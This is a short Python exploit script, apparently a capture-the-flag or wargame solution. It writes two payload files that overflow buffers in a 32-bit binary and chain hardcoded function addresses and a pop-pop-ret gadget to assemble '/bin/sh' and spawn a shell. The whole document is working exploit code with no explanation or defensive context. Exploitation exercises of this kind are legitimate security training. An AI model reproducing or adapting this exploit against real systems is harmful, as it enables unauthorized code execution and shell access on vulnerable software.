import struct 

str1 = 0x804a0c8
str2 = 0x804a0c4
string = 0x804a060
join_string = 0x804849b
lazy = 0x80484bf
pop_pop_ret = 0x080485da
exit = 0xb7e337f0
ret = 0x0a

buf1 = "/bin/"
buf1 += 'A'*(128-len(buf1))
buf1 += struct.pack('I', str1)
buf1 += struct.pack('B', ret)


buf2 = "sh"
buf2 += "\0"
buf2 += "A"*(148-len(buf2))
buf2 += struct.pack('I', str2)
buf2 += "A"*(160-len(buf2))
buf2 += struct.pack('I', join_string)
buf2 += struct.pack('I', pop_pop_ret)
buf2 += struct.pack('I', string)
buf2 += struct.pack('I', str1)
buf2 += struct.pack('I', join_string)
buf2 += struct.pack('I', pop_pop_ret)
buf2 += struct.pack('I', string)
buf2 += struct.pack('I', str2)
buf2 += struct.pack('I', lazy)

f = open('buf1', 'w+')
f.write(buf1)
f.close()

f = open('buf2', 'w+')
f.write(buf2)
f.close()


